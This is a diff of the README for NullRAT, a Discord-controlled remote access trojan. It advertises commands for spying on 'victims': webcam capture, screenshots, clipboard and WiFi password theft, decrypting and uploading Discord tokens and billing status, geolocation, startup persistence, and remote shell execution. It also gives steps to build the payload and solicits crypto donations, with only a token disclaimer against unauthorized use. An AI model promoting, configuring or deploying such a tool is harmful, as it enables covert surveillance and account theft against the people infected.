@@ -6,10 +6,8 @@
 
 ---
 
-<strong>TOTAL SYSTEM REWRITE IN PROGRESS, SORRY FOR NO NEW RELEASES. NULLRAT V9 SOON</strong>
 
 </br>
-
 
 
 > # Features:
@@ -21,11 +19,11 @@
 + Designed to be very noob friendly with intuitive features:
     +- Controlled via slash commands
     +- User friendly interface
-    +- Using modern Discord API Features
+    +- Uses pagination and embed buttons, along with other neat features
   
-+ Supports targeting multiple victims using IP Address
++ Supports targeting multiple victims regardless of who they are
   
-+ Created with small size and anonymity in mind! (7MB payload)
++ Created with small size and anonymity in mind! (6.70MB payload)
 ```
 
 <h3 align=center>NullRAT Payload Features</h3>
@@ -33,54 +31,50 @@
 ```diff
 === A full list of commands can be found by typing `/` ===  
  
-+ Find the public IP Address of the victim [/getip]
-  
++ Find all present victims at real time  [/listvictims]
++ Kill any running task that isn't Admin [/kill_runningtasks]
++ Take pictures using victim's webcam    [/get_webcam]
++ Take screenshot of victim's monitor    [/get_screenshot]
++ Get victim's system information        [/get_systeminfo] 
++ Get victim's clipboard text history    [/get_clipboard]
++ Send files/payloads to victim's PC     [/sendfiles]
++ Receive files from victim's PC         [/receivefiles]
++ Run any sent payloads quickly          [/runfile]
++ Find any environment variables         [/get_environment]
++ Add executable to startup with one command                  [/startup]
++ Decrypt the new encrypted Discord Tokens and upload them    [/discord_tokens]
++ Check the decrypted Discord Tokens and upload all user info [/discord_checked]
 + Directly upload Discord Tokens from 10+ application paths [/raw_tokens]
-  
-+ Check the user tokens and upload all user info: [/checked_tokens]
+
++ Find WIFI SSIDs [/wifilist] and passwords   [/wifipass] in victim's PC
++ Hide files      [/hidefile] or unhide files [/unhidefile] in victim's PC
++ Shutdown the RAT elegantly using the modern [/shutdown] commands
++ Execute CMD commands & Powershell commands  [/cmd]  [/powershell]
+
++ Check the user tokens and upload all user info:           [/checked_tokens]
     - Username, Tag and ID
     - Email Address 
     - Phone Number
     - Nitro Status
-
-+ [NEW!] Decrypt the new encrypted Discord Tokens and upload them [/discord_tokens]
-  
-+ [NEW!] Check the decrypted Discord Tokens [/discord_checked]
-  
-+ Find victim's geographic information: [/geolocate]
+    - Billing Info Status
+    
++ Find victim's geographic information [/get_geolocation]
     - Country
     - City
     - Region
-    - Latitude & longitude
     - Zip Code
     - ISP
-  
-+ Take pictures using victim's webcam [/webcam_image]
-  
-+ Take screenshot of victim's monitor [/screenshot]
-  
-+ Send files/payloads to victim's PC [/sendfiles]
-
-+ Receive files from victim's PCs [/receivefiles]
+    - Google Maps Link
     
-+ Get victim's system information [/systeminfo]
-  
-+ Execute CMD/Powershell command [/shell]
-  
-+ Find any environment variables [/get_environment]
-  
-+ See dir contents, change dir & do other dir manipulation
-  
-+ Get victim's clipboard text history [/clipboard]
-  
-+ Add executable to startup with one command [/startup]
-  
-+ [WIP!] Find their billing information
-  
-+ Find their wifi names [/wifilist] and passwords [/wifipass]
-  
-+ Hide [/hidefile] or unhide files [/unhidefile] in their computer
-  
++ Directory manipulation commands:
+    - [/get_currentdir]
+    - [/set_currentdir]
+    - [/list_directory]
+    
++ List any form of running tasks in victim's PC: 
+    - [/list_runningtasks]
+    - [/list_runningstore]
+    
 + ...and much more!
 ```
 
@@ -99,13 +93,13 @@
 #### Preparation:
 - Create a Discord Bot and [get it's token](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#discord-bot-token)
 - [Create a bot invite link with the correct scopes](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#proper-bot-invite-link) and add it to your server
-- Optionally, store the [Notification ID](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#channel-id) and [Server ID](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#server-ids) along with the token for easy access
+- Store the [Notification ID](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#channel-id) and [Server ID](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#server-ids) along with the token for ease of access
 
 #### Steps:
-1. Dowload the latest release of NullRAT (git cloning/download zip will no longer work)
+1. Dowload the latest release of NullRAT (recommended) [**git clone** and **download zip** is supported, but will be unstable]
 2. Run the AIO File and follow the prompts. NullRAT payload will be right there!
 
-- **Video tutorial:** [https://youtu.be/G8CsgWYiwWI](https://youtu.be/G8CsgWYiwWI)
+- **Video tutorial:** Soon
 - **NullRAT Discord:** [https://discord.com/invite/s9QANySc2q](https://discord.com/invite/s9QANySc2q)
 
 
@@ -113,23 +107,64 @@
 
 
 > # Donate:
-<h6 align=center>( <b>Even if you can't donate, it would be great if you starred this project</b> )</br></br>
-( <b>It just gives me more motivation to work on it and improve it</b> )</h6>
+
+**Donations keep me running and motivated.
+I thank you in advance for your generous support**
 
 <details>
-<summary>XMR Address</summary>
+<summary>Monero XMR</summary>
   
 </br>48ehSGucnMHFir7YYT9eDfDrXZcrRx9PEeFL52tyDRTz3ZYSbQpnzoaXW484TzvEHkDucLiGGa7nAgcVy7gZSbsuHqgL3Er
+</details>
+
+<details>
+<summary>BTC [BIP49] (SegWit)</summary>
+  
+</br>37fyekYxe6EaNYZyhkcNYi6djfbTTQndHc
+
+![BTC_QR](https://user-images.githubusercontent.com/70959549/178553683-aaece326-92f6-48fb-a1cb-2c3847c66dbd.png)
+
+</details>
+
+<details>
+<summary>LTC [BIP49] (SegWit)</summary>
+  
+</br>MKxiQRMYcCPMmsBHEWr5fVsFo669k4hw6U
+
+![LTC_QR](https://user-images.githubusercontent.com/70959549/178554082-78f6d73b-4079-4c11-b207-3b7cd1f9f374.png)
+
+</details>
+
+<details>
+<summary>ETH (erc20)</summary>
+
+</br>0xbC9B3F1b7B687eA193f6f85c7AEF669597F3db02
+
+![ETH_QR](https://user-images.githubusercontent.com/70959549/178554327-f8f4346b-0e94-4000-98b9-f5150915b0c8.png)
+
+</details>
+
+<details>
+<summary>USDC [preferred] (erc20)</summary>
+  
+</br>0xbC9B3F1b7B687eA193f6f85c7AEF669597F3db02
+
+![USDC_QR](https://user-images.githubusercontent.com/70959549/178554327-f8f4346b-0e94-4000-98b9-f5150915b0c8.png)
+
+</details>
+
+<details>
+<summary>MATIC (Polygon)</summary>
+  
+</br>0xbC9B3F1b7B687eA193f6f85c7AEF669597F3db02
+
+![MATIC_QR](https://user-images.githubusercontent.com/70959549/178554327-f8f4346b-0e94-4000-98b9-f5150915b0c8.png)
+
 </details>
 
 
 </br>
 
-
-> # Credits:
-1) Sp00p64 
-2) Buntii
-3) usrDottik
 
 **Infecting others via NullRAT without their permission is obviously not supported by me.**
 <h4 align=right>Software designed by NullCode</h6>
